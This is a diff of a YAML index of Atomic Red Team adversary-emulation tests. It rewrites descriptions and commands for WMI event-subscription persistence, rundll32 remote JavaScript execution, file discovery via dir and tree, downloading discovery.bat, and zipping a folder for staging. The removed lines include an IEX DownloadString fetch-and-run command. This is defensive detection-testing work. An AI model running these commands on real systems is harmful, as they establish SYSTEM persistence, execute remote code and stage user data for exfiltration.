@@ -5075,11 +5075,10 @@ persistence:
       modified: '2019-10-15T18:43:47.703Z'
       identifier: T1084
     atomic_tests:
-    - name: Persistence
+    - name: Persistence via WMI Event Subscription
       description: |
-        Run from an administrator powershell window
-
-        After running, reboot the victim machine. After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.
+        Run from an administrator powershell window. After running, reboot the victim machine.
+        After it has been online for 4 minutes you should see notepad.exe running as SYSTEM.
 
         Code references
 
@@ -5111,7 +5110,6 @@ persistence:
           $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
           $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'AtomicRedTeam-WMIPersistence-Example'"
           $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
-
           $FilterConsumerBindingToCleanup | Remove-WmiObject
           $EventConsumerToCleanup | Remove-WmiObject
           $EventFilterToCleanup | Remove-WmiObject
@@ -11663,7 +11661,8 @@ defense-evasion:
       identifier: T1085
     atomic_tests:
     - name: Rundll32 execute JavaScript Remote Payload With GetObject
-      description: 'Test execution of a remote script using rundll32.exe
+      description: 'Test execution of a remote script using rundll32.exe. Upon execution
+        notepad.exe will be opened.
 
 '
       supported_platforms:
@@ -17338,9 +17337,9 @@ discovery:
       identifier: T1083
     atomic_tests:
     - name: File and Directory Discovery (cmd.exe)
-      description: 'Find or discover files on the file system
-
-'
+      description: |
+        Find or discover files on the file system.  Upon execution, the file "download" will be placed in the temporary folder and contain the output of
+        all of the data discovery commands.
       supported_platforms:
       - windows
       executor:
@@ -17350,13 +17349,13 @@ discovery:
           dir /s c:\ >> %temp%\download
           dir /s "c:\Documents and Settings" >> %temp%\download
           dir /s "c:\Program Files\" >> %temp%\download
-          dir /s d:\ >> %temp%\download
           dir "%systemdrive%\Users\*.*" >> %temp%\download
           dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> %temp%\download
           dir "%userprofile%\Desktop\*.*" >> %temp%\download
           tree /F >> %temp%\download
     - name: File and Directory Discovery (PowerShell)
-      description: 'Find or discover files on the file system
+      description: 'Find or discover files on the file system. Upon execution, file
+        and folder information will be displayed.
 
 '
       supported_platforms:
@@ -23689,7 +23688,8 @@ execution:
       identifier: T1085
     atomic_tests:
     - name: Rundll32 execute JavaScript Remote Payload With GetObject
-      description: 'Test execution of a remote script using rundll32.exe
+      description: 'Test execution of a remote script using rundll32.exe. Upon execution
+        notepad.exe will be opened.
 
 '
       supported_platforms:
@@ -27306,17 +27306,24 @@ collection:
       identifier: T1074
     atomic_tests:
     - name: Stage data from Discovery.bat
-      description: 'Utilize powershell to download discovery.bat and save to a local
-        file
-
-'
+      description: |
+        Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,
+        verify that the file is saved in the temp directory.
       supported_platforms:
       - windows
+      input_arguments:
+        output_file:
+          description: Location to save downloaded discovery.bat file
+          type: Path
+          default: "$env:TEMP\\discovery.bat"
       executor:
         name: powershell
         elevation_required: false
-        command: 'IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat'')
-          > pi.log
+        command: 'Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.bat"
+          -OutFile #{output_file}
+
+'
+        cleanup_command: 'Remove-Item -Force #{output_file} -ErrorAction Ignore
 
 '
     - name: Stage data from Discovery.sh
@@ -27334,21 +27341,28 @@ collection:
 
 '
     - name: Zip a Folder with PowerShell for Staging in Temp
-      description: 'Use living off the land tools to zip a file and stage it in the
-        Windows temporary folder for later exfiltration.
-
-'
+      description: |
+        Use living off the land tools to zip a file and stage it in the Windows temporary folder for later exfiltration. Upon execution, Verify that a zipped folder named Folder_to_zip.zip
+        was placed in the temp directory.
       supported_platforms:
       - windows
+      input_arguments:
+        input_file:
+          description: Location of file or folder to zip
+          type: Path
+          default: PathToAtomicsFolder\T1074\bin\Folder_to_zip
+        output_file:
+          description: Location to save zipped file or folder
+          type: Path
+          default: "$env:TEMP\\Folder_to_zip.zip"
       executor:
         name: powershell
         elevation_required: false
-        command: 'Compress-Archive -Path $PathToAtomicsFolder\T1074\bin\Folder_to_zip
-          -DestinationPath $env:TEMP\Folder_to_zip.zip
+        command: 'Compress-Archive -Path #{input_file} -DestinationPath #{output_file}
+          -Force
 
 '
-        cleanup_command: 'Remove-Item -Path $env:TEMP\Folder_to_zip.zip -ErrorAction
-          Ignore
+        cleanup_command: 'Remove-Item -Path #{output_file} -ErrorAction Ignore
 
 '
   '':
